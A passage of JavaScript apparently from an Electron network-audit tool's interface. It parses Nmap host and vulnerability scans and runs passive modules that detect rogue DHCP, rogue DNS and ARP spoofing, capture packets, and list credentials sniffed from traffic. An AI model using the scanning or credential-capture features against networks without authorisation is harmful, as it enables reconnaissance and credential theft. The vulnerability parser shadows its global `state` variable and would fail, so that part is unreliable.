      btnRunDeepScan.classList.remove('pulsing', 'danger-pulsing');
      btnRunDeepScan.classList.add('warning');
      btnRunDeepScan.removeAttribute('data-scanning');
      
      if (wasCancelled) {
        btnRunDeepScan.innerHTML = `<span class="icon">⚠️</span> Scan Cancelled`;
      } else {
        btnRunDeepScan.innerHTML = `<span class="icon">✅</span> Scan Complete`;
      }
      
      const dsResults = document.getElementById('deep-scan-results');
      if (dsResults && dsResults.innerHTML.trim() === '') {
        dsResults.innerHTML = `<div class="ds-record" style="text-align:center; color: var(--text-muted); opacity: 0.7;">${wasCancelled ? 'Scan stopped before ports were found.' : 'No open ports discovered.'}</div>`;
      }
    }

    if (scanAll.state.active.has(ip)) {
      scanAll.onHostProgress(ip, 100); // Force to 100% just in case before removal
      
      // Delay removal slightly so the UI gets a chance to render 100%
      setTimeout(() => {
        scanAll.onHostDone(ip);
      }, 500);
    }
    
    // Refresh the card for this IP so the badge updates and the progress badge is removed
    const card = document.getElementById(`host-${ip.replace(/\./g, '-')}`);
    const host = state.hosts.find(h => h.ip === ip);
    if (card && host) {
       const badgeContainer = card.querySelector('.security-badge-container');
       if (badgeContainer) {
         updateSecurityBadgeDOM(host, badgeContainer);
       }
    }
  });

  // Nmap Event Receivers
  window.electronAPI.onNmapScanResult && window.electronAPI.onNmapScanResult((data) => {
    let type = data.type;
    const chunk = data.chunk;
    
    // Parse Progress Stats
    // Example: "Stats: 0:00:03 elapsed; 0 state.hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 15.38% done; ETC: 14:10 (0:00:17 remaining)"
    const timingMatch = chunk.match(/Timing:\s*About\s*([\d.]+)%\s*done/i);
    if (timingMatch) {
       const percent = parseFloat(timingMatch[1]).toFixed(1);
       const target = data.target;
       const port = type === 'port' ? target.split(':')[1] : null;
       const btnIds = { 'deep': 'btn-nmap-deep', 'host': 'btn-nmap-host', 'vuln': 'btn-nmap-vuln', 'port': `btn-nmap-port-${port}` };
       const btn = document.getElementById(btnIds[type]);
       
       if (btn && btn.getAttribute('data-scanning') === 'true') {
         // Determine original label
         let label = 'Scan';
         if (type === 'deep') label = 'Deep Scan';
         if (type === 'host') label = 'Host Scan';
         if (type === 'vuln') label = 'Vuln Scan';
         if (type === 'port') label = `Port ${port} Scan`;
         
         btn.innerHTML = `<span class="icon">🛑</span> Cancel ${label}... (${percent}%)`;
       }
    }

    // Update scan-all status bar with per-host Nmap progress
    if (scanAll.state.isRunning && scanAll.state.type !== 'native') {
      const ip = type === 'port' ? data.target.split(':')[0] : data.target;
      if (scanAll.state.active.has(ip) && timingMatch) {
        scanAll.onHostProgress(ip, parseFloat(timingMatch[1]));
      }
    }
    
    const bannerBlock = document.getElementById(`nmap-live-banner-${type}`);
    if (bannerBlock) {
      if (bannerBlock.innerText === 'Initializing...') bannerBlock.innerText = '';
      bannerBlock.textContent += chunk;
    }
  });

  window.electronAPI.onNmapScanComplete && window.electronAPI.onNmapScanComplete((data) => {
    const target = data.target;
    const type = data.type;
    const ip = type === 'port' ? target.split(':')[0] : target;
    const port = type === 'port' ? target.split(':')[1] : null;

    // Save state
    const hostIdx = state.hosts.findIndex(h => h.ip === ip);
    if (hostIdx >= 0) {
      if (!state.hosts[hostIdx].nmapData) state.hosts[hostIdx].nmapData = { ports: {} };
      if (type === 'port') {
         state.hosts[hostIdx].nmapData.ports[port] = data.fullOutput;
      } else {
         state.hosts[hostIdx].nmapData[type] = data.fullOutput;
      }

      // Metadata Extraction for Dashboard
      let metadataChanged = false;
      const fullOutput = data.fullOutput;

      // Extract OS
      if (type === 'host' || type === 'deep') {
        // OS Extraction
        const osMatch1 = fullOutput.match(/OS details:\s*([^\r\n]+)/i);
        const osMatch2 = fullOutput.match(/Service Info:.*?OS:\s*([^;]+);/i);
        const osName = (osMatch1 && osMatch1[1]) || (osMatch2 && osMatch2[1]);
        if (osName) {
           state.hosts[hostIdx].os = `(Nmap) ${osName.substring(0, 30)}`;
           metadataChanged = true;
        }

        // Hostname Extraction
        const hostMatch = fullOutput.match(/Nmap scan report for (([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}|[a-zA-Z0-9-]+)\s+\(/);
        if (hostMatch && hostMatch[1]) {
           const foundName = hostMatch[1];
           // Always overwrite if Nmap gives us a real name (not just echoing the IP)
           if (foundName !== ip) {
             state.hosts[hostIdx].hostname = foundName;
             metadataChanged = true;
           }
        }

        // Hardware Vendor Extraction (from MAC Address line)
        const macMatch = fullOutput.match(/MAC Address:\s*[0-9A-Fa-f:]{17}\s*\(([^\)]+)\)/i);
        if (macMatch && macMatch[1] && macMatch[1] !== 'Unknown') {
           state.hosts[hostIdx].vendor = macMatch[1];
           metadataChanged = true;
        }

        // Device Type Extraction
        const deviceMatch = fullOutput.match(/Device type:\s*([^\r\n]+)/i);
        if (deviceMatch && deviceMatch[1]) {
           state.hosts[hostIdx].deviceType = deviceMatch[1];
           metadataChanged = true;
        }

        // Kernel Extraction
        const kernelMatch = fullOutput.match(/Running(?:\s*\(JUST GUESSING\))?:\s*([^\r\n]+)/i);
        if (kernelMatch && kernelMatch[1]) {
           state.hosts[hostIdx].kernel = kernelMatch[1];
           metadataChanged = true;
        }

        // Extract Open Ports to bump Security Badge
        const portMatches = [...fullOutput.matchAll(/(\d+)\/tcp\s+open\s+/g)];
        if (portMatches.length > 0) {
           const foundPorts = portMatches.map(m => parseInt(m[1], 10));
           const existingSet = new Set(state.hosts[hostIdx].ports || []);
           let newPortsAdded = false;
           foundPorts.forEach(fp => {
             if (!existingSet.has(fp)) {
                existingSet.add(fp);
                newPortsAdded = true;
             }
           });
           if (newPortsAdded) {
              state.hosts[hostIdx].ports = Array.from(existingSet).sort((a,b) => a-b);
              metadataChanged = true;
           }
        }
      }

      // Extract Vulnerabilities
      if (type === 'vuln') {
        if (!state.hosts[hostIdx].nmapData.vulnerabilities) {
           state.hosts[hostIdx].nmapData.vulnerabilities = [];
        }

        let newVulnsFound = false;

        // 1. Standard Nmap `|   VULNERABILITY:` blocks
        const vulnBlocks = fullOutput.split('|   VULNERABILITY:');
        vulnBlocks.shift(); // remove everything before first block

        vulnBlocks.forEach(block => {
           // Parse details
           const idMatch = block.match(/IDs:\s*([^ \r\n]+)/i);
           const stateMatch = block.match(/State:\s*([^\r\n]+)/i);
           const riskMatch = block.match(/Risk factor:\s*([^\r\n]+)/i);

           if (idMatch && idMatch[1]) {
             const id = idMatch[1].replace('CVE:', '').trim();
             const state = stateMatch ? stateMatch[1].trim() : 'UNKNOWN';
             const risk = riskMatch ? riskMatch[1].trim().toLowerCase() : 'info'; // default info

             // Deduplicate
             if (!state.hosts[hostIdx].nmapData.vulnerabilities.some(v => v.id === id)) {
                state.hosts[hostIdx].nmapData.vulnerabilities.push({
                   id: id,
                   state: state,
                   severity: risk,
                   details: block.trim()
                });
                newVulnsFound = true;
             }
           }
        });

        // 2. Vulners script table output
        // Example: |     	CVE-2023-38408	9.8	https://vulners.com...	*EXPLOIT*
        const vulnersMatches = [...fullOutput.matchAll(/\|\s+([^\s]+)\s+([0-9.]+)\s+(https?:\/\/\S+)[ \t]*(\*EXPLOIT\*)?/gi)];
        
        vulnersMatches.forEach(match => {
           const id = match[1].trim();
           const cvss = parseFloat(match[2]);
           const url = match[3].trim();
           const isExploit = !!match[4];
           
           // map CVSS to severity
           let severity = 'info';
           if (cvss >= 9.0) severity = 'critical';
           else if (cvss >= 7.0) severity = 'high';
           else if (cvss >= 4.0) severity = 'medium';
           else severity = 'low';

           // Deduplicate
           if (!state.hosts[hostIdx].nmapData.vulnerabilities.some(v => v.id === id)) {
              state.hosts[hostIdx].nmapData.vulnerabilities.push({
                 id: id,
                 state: isExploit ? 'EXPLOIT AVAILABLE' : 'VULNERABLE',
                 severity: severity,
                 details: `CVSS Score: ${cvss}\nURL: <a href="${url}" target="_blank" style="color: var(--primary); text-decoration: underline;">${url}</a>${isExploit ? '\n<b>*EXPLOIT AVAILABLE*</b>' : ''}`
              });
              newVulnsFound = true;
           }
        });

        if (newVulnsFound) {
            // Recount and push to the primary deepAudit object so the dashboard badge inherently picks it up
            if (!state.hosts[hostIdx].deepAudit) {
               state.hosts[hostIdx].deepAudit = { history: [], vulnerabilities: 0, warnings: 0 };
            }

            // Recalculate totals directly based on parsed severity
            let criCount = state.hosts[hostIdx].deepAudit.history.filter(h => h.vulnerable && h.severity === 'critical').length;
            let warCount = state.hosts[hostIdx].deepAudit.history.filter(h => h.vulnerable && h.severity === 'warning').length;

            state.hosts[hostIdx].nmapData.vulnerabilities.forEach(v => {
               if (v.severity === 'high' || v.severity === 'critical') criCount++;
               if (v.severity === 'medium' || v.severity === 'warning') warCount++;
            });

            state.hosts[hostIdx].deepAudit.vulnerabilities = criCount;
            state.hosts[hostIdx].deepAudit.warnings = warCount;
        }

        // Always trigger metadata changed on Vuln scans to refresh UI into "Audited Secure" mode if 0 vulns found
        metadataChanged = true;
      }

      if (metadataChanged) {
        debouncedRenderAllHosts();

        // Explicitly update the main dashboard Host Card (since debouncedRenderAllHosts only alters display state)
        const card = document.getElementById(`host-${ip.replace(/\./g, '-')}`);
        if (card) {
           const badgeContainer = card.querySelector('.security-badge-container');
           if (badgeContainer) updateSecurityBadgeDOM(state.hosts[hostIdx], badgeContainer);
           
           try {
             const row1 = card.querySelector('.host-body .info-row:nth-child(1) .value');
             if (row1) row1.innerText = state.hosts[hostIdx].hostname || 'Unknown';
             const row2 = card.querySelector('.host-body .info-row:nth-child(2) .value');
             if (row2) row2.innerText = state.hosts[hostIdx].os || 'Unknown';
             const row3 = card.querySelector('.host-body .info-row:nth-child(3) .value');
             if (row3) row3.innerText = state.hosts[hostIdx].vendor || 'Unknown';
           } catch (e) {}
        }
        
        // Cleanly update the specific opened Details panel port map if it's the active one
        const btnRunDeepScan = document.getElementById('btn-run-deep-scan');
        if (btnRunDeepScan && btnRunDeepScan.getAttribute('data-ip') === ip) {
           if (type === 'vuln') {
              // A vulnerability scan creates complex HTML blocks. The cleanest way to show them live
              // is to seamlessly redraw the Host Details panel.
              openDetailsPanel(state.hosts[hostIdx]);
              // Restore the Nmap tab view so it doesn't jarringly switch back to Native
              setTimeout(() => {
                 const nmapBtn = document.getElementById('btn-engine-nmap');
                 if (nmapBtn) nmapBtn.click();
              }, 10);
           } else {
              // For standard metadata, perform lightweight inline DOM replacements
              const elOs = document.getElementById('dp-os');
              if (elOs) elOs.innerText = state.hosts[hostIdx].os || 'Unknown';

              const elHostname = document.getElementById('dp-hostname');
              if (elHostname) elHostname.innerText = state.hosts[hostIdx].hostname || 'Unknown';

              const elVendor = document.getElementById('dp-vendor');
              if (elVendor) elVendor.innerText = state.hosts[hostIdx].vendor || 'Unknown';
              
              const elDevice = document.getElementById('dp-device');
              const elDeviceRow = document.getElementById('dp-device-row');
              if (elDeviceRow && state.hosts[hostIdx].deviceType) {
                 elDeviceRow.style.display = 'flex';
                 if (elDevice) elDevice.innerText = state.hosts[hostIdx].deviceType;
              }

              const elKernel = document.getElementById('dp-kernel');
              const elKernelRow = document.getElementById('dp-kernel-row');
              if (elKernelRow && state.hosts[hostIdx].kernel) {
                 elKernelRow.style.display = 'flex';
                 if (elKernel) elKernel.innerText = state.hosts[hostIdx].kernel;
              }
           }
        }
      }
    }

    // Reset UI buttons
    const btnIds = {
      'deep': 'btn-nmap-deep',
      'host': 'btn-nmap-host',
      'vuln': 'btn-nmap-vuln',
      'custom': 'btn-nmap-custom',
      'port': `btn-nmap-port-${port}`,
      'ncat': 'btn-run-ncat'
    };
    
    const btn = document.getElementById(btnIds[type]);
    if (btn) {
      const wasCancelled = btn.getAttribute('data-scanning') === 'cancelling';
      btn.classList.remove('pulsing', 'danger-pulsing');
      btn.removeAttribute('data-scanning');
      
      if (type === 'ncat') {
         btn.innerHTML = wasCancelled ? `<span class="icon">⚠️</span> Disconnected` : `<span class="icon">🔌</span> Connect & Send`;
      } else {
         btn.innerHTML = wasCancelled ? `<span class="icon">⚠️</span> Scan Cancelled` : `<span class="icon">✅</span> Scan Complete`;
      }

      if (wasCancelled) {
        const bannerBlock = document.getElementById(`nmap-live-banner-${type}`);
        if (bannerBlock) bannerBlock.textContent += '\n\n[DISCONNECTED]';
      }
    }

    // Scan-all queue: advance to next host if this was part of a batch nmap scan
    if (scanAll.state.isRunning && scanAll.state.type !== 'native' && scanAll.state.active.has(ip)) {
      scanAll.onHostDone(ip);
    }
  });

  window.electronAPI.onNmapScanError && window.electronAPI.onNmapScanError((data) => {
    const type = data.type;
    const bannerBlock = document.getElementById(`nmap-live-banner-${type}`);
    if (bannerBlock) {
       bannerBlock.textContent += `\n\n[ERROR]: ${data.error}`;
    }
    
    const target = data.target;
    const ip = type === 'port' ? target.split(':')[0] : target;
    const port = type === 'port' ? target.split(':')[1] : null;
    const btnIds = { 'deep': 'btn-nmap-deep', 'host': 'btn-nmap-host', 'vuln': 'btn-nmap-vuln', 'custom': 'btn-nmap-custom', 'port': `btn-nmap-port-${port}`, 'ncat': 'btn-run-ncat' };
    const btn = document.getElementById(btnIds[type]);
    if (btn) {
      btn.classList.remove('pulsing', 'danger-pulsing');
      btn.removeAttribute('data-scanning');
      btn.innerHTML = type === 'ncat' ? `<span class="icon">❌</span> Connection Failed` : `<span class="icon">❌</span> Scan Failed`;
    }

    // Scan-all queue: advance even on error
    // Scan-all queue: advance even on error
    if (scanAll.state.isRunning && scanAll.state.type !== 'native' && scanAll.state.active.has(ip)) {
      scanAll.onHostDone(ip);
    }
  });

  // --- PASSIVE NETWORK INTELLIGENCE ---
  const passiveTabs = document.querySelectorAll('.modal-tab[data-passive-tab]');
  const passiveTabPanes = document.querySelectorAll('.passive-tab-pane');
  const ui = {};
  ['dhcp', 'creds', 'dns', 'arp', 'rogue-dns'].forEach(m => {
    ui[m] = {
      toggle: document.getElementById(`toggle-${m}`),
      status: document.getElementById(`status-${m}`),
      badge: document.getElementById(`badge-${m}`),
      results: document.getElementById(`passive-results-${m}`)
    };
  });

  const btnAcceptCreds = document.getElementById('btn-accept-creds');
  const btnRejectCreds = document.getElementById('btn-reject-creds');
  const credDisclaimerBanner = document.getElementById('cred-disclaimer-banner');
  let isCredsAccepted = false;

  const btnStopAllPassive = document.getElementById('btn-stop-all-passive');
  const btnExportPcap = document.getElementById('btn-export-pcap');
  const passiveErrorBanner = document.getElementById('passive-error-banner');
  const passiveErrorText = document.getElementById('passive-error-text');
  const btnClosePassiveError = document.getElementById('btn-close-passive-error');

  btnClosePassiveError?.addEventListener('click', () => {
    passiveErrorBanner.style.display = 'none';
  });

  passiveTabs.forEach(tab => {
    tab.addEventListener('click', () => {
      passiveTabs.forEach(t => t.classList.remove('active'));
      passiveTabPanes.forEach(p => p.style.display = 'none');
      tab.classList.add('active');
      document.getElementById(`tab-passive-${tab.dataset.passiveTab}`).style.display = 'block';
    });
  });

  const passiveInterfaceSelect = document.getElementById('passive-interface-select');

  const passiveModulesConfig = {
    dhcp: { type: 'card', getWaitEl: () => null },
    creds: { type: 'table', requiresConsent: true, getWaitEl: () => {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 5;
      td.style.cssText = 'text-align:center; color: var(--text-muted); padding: 12px;';
      td.textContent = 'Waiting for data...';
      tr.appendChild(td);
      return tr;
    } },
    dns:  { type: 'table', getWaitEl: () => {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 3;
      td.style.cssText = 'text-align:center; color: var(--text-muted); padding: 12px;';
      td.textContent = 'Waiting for data...';
      tr.appendChild(td);
      return tr;
    } },
    arp:  { type: 'card', getWaitEl: () => null },
    'rogue-dns': { type: 'card', getWaitEl: () => null }
  };

  const btnStartLivePcap = document.getElementById('btn-start-live-pcap');
  const btnStopLivePcap = document.getElementById('btn-stop-live-pcap');
  const inputLivePcapHost = document.getElementById('live-pcap-host');
  const inputLivePcapDuration = document.getElementById('live-pcap-duration');
  const inputLivePcapBpf = document.getElementById('live-pcap-bpf');
  const livePcapStats = document.getElementById('live-pcap-total-stats');
  const livePcapWarnings = document.getElementById('live-pcap-warnings');
  const livePcapResults = document.getElementById('live-pcap-results');

  btnStartLivePcap?.addEventListener('click', async () => {
    const selectedOption = passiveInterfaceSelect.options[passiveInterfaceSelect.selectedIndex];
    if (!selectedOption || !selectedOption.dataset.name) {
      alert('Please select a valid network interface first.');
      return;
    }
    const ifaceName = selectedOption.dataset.name;

    const hostFilter = inputLivePcapHost.value.trim();
    if (!hostFilter) {
      alert('Please provide a Host Filter (IP address) to capture packets for.');
      return;
    }

    btnStartLivePcap.disabled = true;
    btnStopLivePcap.disabled = false;
    livePcapResults.innerHTML = '<tr><td colspan="5" style="text-align:center; color:var(--text-muted); padding:12px;">Capturing packets...</td></tr>';
    livePcapStats.textContent = '0 Packets / 0 Bytes';
    livePcapWarnings.textContent = '';
    
    state.pcapPackets = [];

    const options = {
      duration: parseInt(inputLivePcapDuration.value, 10) || 60,
      host: hostFilter,
      bpf: inputLivePcapBpf.value.trim() || undefined
    };

    const res = await api.startPassiveCapture('pcap', ifaceName, options);
    if (res.status !== 'started') {
      btnStartLivePcap.disabled = false;
      btnStopLivePcap.disabled = true;
      livePcapWarnings.textContent = res.error || 'Failed to start PCAP capture.';
    }
  });

  btnStopLivePcap?.addEventListener('click', async () => {
    await api.stopPassiveCapture('pcap');
    btnStartLivePcap.disabled = false;
    btnStopLivePcap.disabled = true;
  });

  const btnImportLivePcap = document.getElementById('btn-import-live-pcap');
  btnImportLivePcap?.addEventListener('click', async () => {
    // We already have a generic browse mechanism or we can use showOpenDialog.
    // Wait, let's use a native input element programmatically to get the file,
    // or call an API method to open the file dialog on main process.
    // Looking at the preload / main.js, we don't have a direct "importPcapDialog" method.
    // Let's create an input element dynamically.
    const fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.accept = '.pcap,.pcapng';
    fileInput.onchange = async (e) => {
      const file = e.target.files[0];
      if (!file) return;
      
      livePcapResults.innerHTML = '<tr><td colspan="5" style="text-align:center; color:var(--text-muted); padding:12px;">Analyzing imported PCAP...</td></tr>';
      livePcapStats.textContent = '0 Packets / 0 Bytes';
      livePcapWarnings.textContent = '';
      state.pcapPackets = [];

      const res = await api.analyzePcapFile(file.path);
      if (res.status !== 'started') {
         livePcapWarnings.textContent = res.error || 'Failed to analyze PCAP file.';
      }
    };
    fileInput.click();
  });

  async function handlePassiveToggle(moduleKey, iface) {
    const { requiresConsent, getWaitEl } = passiveModulesConfig[moduleKey];
    const moduleUi = ui[moduleKey];

    if (moduleUi.toggle.checked) {
      if (!iface) {
        alert('Please select a network interface first.');
        moduleUi.toggle.checked = false;
        return;
      }
      if (requiresConsent && !isCredsAccepted) {
        moduleUi.toggle.checked = false;
        credDisclaimerBanner.style.display = 'block';
        return;
      }

      moduleUi.status.textContent = 'Capturing';
      moduleUi.status.className = 'passive-status capturing';
      
      moduleUi.results.textContent = '';
      const waitEl = getWaitEl();
      if (waitEl) {
        moduleUi.results.appendChild(waitEl);
      }
      
      moduleUi.badge.textContent = '0';
      state.passiveModules[moduleKey].running = true;

      const res = await api.startPassiveCapture(moduleKey, iface, {});
      if (res.status !== 'started') {
        moduleUi.toggle.checked = false;
        state.passiveModules[moduleKey].running = false;
        moduleUi.status.textContent = 'Idle';
        moduleUi.status.className = 'passive-status';
        passiveErrorText.textContent = res.error || `Failed to start ${moduleKey} capture.`;
        passiveErrorBanner.style.display = 'block';
      }
    } else {
      await api.stopPassiveCapture(moduleKey);
      state.passiveModules[moduleKey].running = false;
      moduleUi.status.textContent = 'Idle';
      moduleUi.status.className = 'passive-status';
    }
  }

  ['dhcp', 'creds', 'dns', 'arp', 'rogue-dns'].forEach(m => {
    ui[m].toggle?.addEventListener('change', (e) => {
      handlePassiveToggle(m, passiveInterfaceSelect.value);
    });
  });

  btnAcceptCreds?.addEventListener('click', () => {
    isCredsAccepted = true;
    credDisclaimerBanner.style.display = 'none';
    ui.creds.toggle.checked = true;
    ui.creds.toggle.dispatchEvent(new Event('change'));
  });

  btnRejectCreds?.addEventListener('click', () => {
    credDisclaimerBanner.style.display = 'none';
    ui.creds.toggle.checked = false;
  });

  btnStopAllPassive?.addEventListener('click', async () => {
    await api.stopAllPassive();
    ['dhcp', 'creds', 'dns', 'arp', 'rogue-dns'].forEach(m => {
      ui[m].toggle.checked = false;
      state.passiveModules[m].running = false;
      ui[m].status.textContent = 'Idle';
      ui[m].status.className = 'passive-status';
    });
  });

  window.electronAPI.onPassiveDhcpAlert && window.electronAPI.onPassiveDhcpAlert((alert) => {
    state.passiveModules.dhcp.alerts.push(alert);
    ui.dhcp.badge.textContent = state.passiveModules.dhcp.alerts.length;
    
    if (state.passiveModules.dhcp.alerts.length === 1) ui.dhcp.results.innerHTML = '';
    
    const el = document.createElement('div');
    el.className = `passive-alert-card ${alert.isTrusted ? 'severity-info' : 'severity-critical'}`;
    
    const topRow = document.createElement('div');
    topRow.style.cssText = 'display:flex; justify-content:space-between;';
    
    const titleStr = document.createElement('strong');
    titleStr.textContent = alert.isTrusted ? 'Trusted DHCP Server' : 'Rogue DHCP Detected!';
    const ipSpan = document.createElement('span');
    ipSpan.style.fontFamily = 'monospace';
    ipSpan.textContent = alert.serverIp;
    
    topRow.appendChild(titleStr);
    topRow.appendChild(ipSpan);
    
    const btmRow = document.createElement('div');
    btmRow.style.cssText = 'display:flex; justify-content:space-between; color:var(--text-muted); opacity:0.8;';
    
    const macSpan = document.createElement('span');
    macSpan.textContent = `MAC: ${alert.serverMac}`;
    const routerSpan = document.createElement('span');
    routerSpan.textContent = `Router: ${alert.offeredRouter || 'N/A'}`;
    
    btmRow.appendChild(macSpan);
    btmRow.appendChild(routerSpan);
    
    el.appendChild(topRow);
    el.appendChild(btmRow);
    
    ui.dhcp.results.prepend(el);
  });

  window.electronAPI.onPassiveCredFound && window.electronAPI.onPassiveCredFound((cred) => {
    state.passiveModules.creds.findings.push(cred);
    ui.creds.badge.textContent = state.passiveModules.creds.findings.length;
    
    if (state.passiveModules.creds.findings.length === 1) ui.creds.results.innerHTML = '';
    
    const tr = document.createElement('tr');
    
    const tdProto = document.createElement('td');
    tdProto.textContent = cred.protocol;
    
    const tdSrc = document.createElement('td');
    tdSrc.style.fontFamily = 'monospace';
    tdSrc.textContent = cred.srcIp;
    
    const tdDst = document.createElement('td');
    tdDst.style.fontFamily = 'monospace';
    tdDst.textContent = `${cred.dstIp}:${cred.port}`;
    
    const tdUser = document.createElement('td');
    tdUser.className = 'selectable-text';
    tdUser.style.fontWeight = '600';
    tdUser.textContent = cred.username;
    
    const tdPass = document.createElement('td');
    tdPass.className = 'selectable-text';
    tdPass.style.color = 'var(--danger)';
      tdPass.textContent = cred.maskedPassword;
    
    tr.appendChild(tdProto);
    tr.appendChild(tdSrc);
    tr.appendChild(tdDst);
    tr.appendChild(tdUser);
    tr.appendChild(tdPass);
    
    ui.creds.results.prepend(tr);
  });

  function autoPromoteDnsHost(host) {
    const exists = state.hosts.some(h => 
      h.ip === host.srcIp || (h.hostname && h.hostname.toLowerCase() === host.hostname.toLowerCase())
    );
    if (!exists && host.srcIp) {
      const newHost = {
        ip: host.srcIp,
        mac: 'Unknown',
        status: 'online',
        hostname: host.hostname,
        vendor: 'Unknown (Passive DNS)',
        routing: [],
        processes: []
      };
      state.hosts.push(newHost);
      debouncedRenderAllHosts();
    }
  }

  window.electronAPI.onPassiveDnsHost && window.electronAPI.onPassiveDnsHost((host) => {
    const key = host.hostname;
    if (!state.passiveModules.dns.hosts.has(key)) {
      state.passiveModules.dns.hosts.set(key, { ...host, count: 1 });
      autoPromoteDnsHost(host);
    } else {
      const existing = state.passiveModules.dns.hosts.get(key);
      existing.count++;
      existing.timestamp = host.timestamp;
      // Re-evaluate promotion if we missed it or IP changed
      autoPromoteDnsHost(host);
    }
    
    ui.dns.badge.textContent = state.passiveModules.dns.hosts.size;
    ui.dns.results.innerHTML = '';
    const sorted = Array.from(state.passiveModules.dns.hosts.values()).sort((a,b) => b.timestamp - a.timestamp);
    sorted.forEach(h => {
      const tr = document.createElement('tr');
      
      const tdHost = document.createElement('td');
      tdHost.className = 'selectable-text';
      tdHost.style.cssText = 'color:var(--primary); font-weight:500;';
      tdHost.textContent = h.hostname;
      
      const tdIp = document.createElement('td');
      tdIp.style.fontFamily = 'monospace';
      tdIp.textContent = h.srcIp || (h.resolvedIps && h.resolvedIps.join(', ')) || 'N/A';
      
      const tdType = document.createElement('td');
      tdType.textContent = `${h.querySource} `;
      const spanCount = document.createElement('span');
      spanCount.style.opacity = '0.6';
      spanCount.textContent = `(x${h.count})`;
      tdType.appendChild(spanCount);
      
      tr.appendChild(tdHost);
      tr.appendChild(tdIp);
      tr.appendChild(tdType);
      
      ui.dns.results.appendChild(tr);
    });
  });

  window.electronAPI.onPassiveArpAlert && window.electronAPI.onPassiveArpAlert((alert) => {
    state.passiveModules.arp.alerts.push(alert);
    ui.arp.badge.textContent = state.passiveModules.arp.alerts.length;
    
    if (state.passiveModules.arp.alerts.length === 1) ui.arp.results.innerHTML = '';
    
    const el = document.createElement('div');
    el.className = `passive-alert-card ${alert.severity === 'critical' ? 'severity-critical' : 'severity-warning'}`;
    
    const topRow = document.createElement('div');
    topRow.style.cssText = 'display:flex; justify-content:space-between;';
    
    const titleStr = document.createElement('strong');
    titleStr.textContent = alert.severity === 'critical' ? 'ARP Spoof Detected!' : 'Gratuitous ARP';
    const ipSpan = document.createElement('span');
    ipSpan.style.fontFamily = 'monospace';
    ipSpan.textContent = alert.ip;
    
    topRow.appendChild(titleStr);
    topRow.appendChild(ipSpan);
    
    const btmRow = document.createElement('div');
    btmRow.style.cssText = 'color:var(--text-muted); opacity: 0.8; margin-top:2px;';
    
    if (alert.severity === 'critical') {
      btmRow.textContent = `MAC changed from ${alert.previousMac} to `;
      const newMacSpan = document.createElement('span');
      newMacSpan.style.cssText = 'color:white; font-weight:600;';
      newMacSpan.textContent = alert.currentMac;
      btmRow.appendChild(newMacSpan);
    } else {
      btmRow.textContent = `Announcing MAC: ${alert.currentMac}`;
    }
    
    el.appendChild(topRow);
    el.appendChild(btmRow);
    
    ui.arp.results.prepend(el);
  });

  window.electronAPI.onPassiveRogueDnsAlert && window.electronAPI.onPassiveRogueDnsAlert((alertMsg) => {
    state.passiveModules['rogue-dns'].alerts.push(alertMsg);
    ui['rogue-dns'].badge.textContent = state.passiveModules['rogue-dns'].alerts.length;
    
    if (state.passiveModules['rogue-dns'].alerts.length === 1) ui['rogue-dns'].results.innerHTML = '';
    
    const card = document.createElement('div');
    card.className = 'ds-record';
    if (!alertMsg.isTrusted) {
      card.style.borderLeftColor = 'var(--danger)';
      card.style.background = 'rgba(235,94,94,0.05)';
    } else {
      card.style.borderLeftColor = 'var(--success)';
      card.style.background = 'rgba(40,167,69,0.05)';
    }

    const title = document.createElement('div');
    title.style.display = 'flex';
    title.style.justifyContent = 'space-between';
    title.style.alignItems = 'center';
    title.style.marginBottom = '6px';
    
    const srv = document.createElement('span');
    srv.style.fontWeight = '600';
    srv.textContent = `${alertMsg.serverIp} (${alertMsg.serverMac})`;
    
    const badge = document.createElement('span');
    badge.style.fontSize = '10px';
    badge.style.padding = '2px 6px';
    badge.style.borderRadius = '4px';
    if (alertMsg.isTrusted) {
      badge.style.background = 'var(--success)';
      badge.style.color = '#fff';
      badge.textContent = 'TRUSTED';
    } else {
      badge.style.background = 'var(--danger)';
      badge.style.color = '#fff';
      badge.textContent = 'ROGUE';
    }
    
    title.appendChild(srv);
    title.appendChild(badge);

    const banner = document.createElement('div');
    banner.className = 'ds-banner selectable-text';
    const queryDiv = document.createElement('div');
    queryDiv.textContent = 'Query: ';
    const queryStrong = document.createElement('strong');
    queryStrong.textContent = alertMsg.domain;
    queryDiv.appendChild(queryStrong);
    
    const answerDiv = document.createElement('div');
    answerDiv.textContent = 'Answer: ';
    const answerStrong = document.createElement('strong');
    answerStrong.textContent = alertMsg.resolvedIp;
    answerDiv.appendChild(answerStrong);
    
    const timeDiv = document.createElement('div');
    timeDiv.style.cssText = 'margin-top:4px;font-size:10px;color:rgba(255,255,255,0.5)';
    timeDiv.textContent = alertMsg.timestamp;
    
    banner.appendChild(queryDiv);
    banner.appendChild(answerDiv);
    banner.appendChild(timeDiv);

    card.appendChild(title);
    card.appendChild(banner);
    ui['rogue-dns'].results.prepend(card);
    
    if (!alertMsg.isTrusted) ui['rogue-dns'].badge.classList.add('danger');
  });

  window.electronAPI.onPassiveError && window.electronAPI.onPassiveError((err) => {
    passiveErrorText.textContent = err;
    passiveErrorBanner.style.display = 'block';
  });

  window.electronAPI.onPcapExportComplete && window.electronAPI.onPcapExportComplete((data) => {
     alert(`PCAP Export Complete!\nSaved ${data.packetCount} packets to:\n${data.filePath}`);
  });
  
  window.electronAPI.onPcapExportError && window.electronAPI.onPcapExportError((err) => {
     alert(`PCAP Export Error:\n${err}`);
  });

  window.electronAPI.onPcapPacketSummary && window.electronAPI.onPcapPacketSummary((summary) => {
    state.pcapPackets = state.pcapPackets || [];
    state.pcapPackets.push(summary);
    if (state.pcapPackets.length > 500) state.pcapPackets.shift(); // Keep last 500
    
    const livePcapResults = document.getElementById('live-pcap-results');
    if (!livePcapResults) return;

    const tr = document.createElement('tr');
    const tdTime = document.createElement('td');
    tdTime.style.whiteSpace = 'nowrap';
    tdTime.textContent = new Date(summary.timestamp).toLocaleTimeString();
    
    const tdSrc = document.createElement('td');
    tdSrc.className = 'selectable-text';
    tdSrc.textContent = summary.srcIp;
    
    const tdDst = document.createElement('td');
    tdDst.className = 'selectable-text';
    tdDst.textContent = summary.dstIp;
    
    const tdProto = document.createElement('td');
    const spanProto = document.createElement('span');
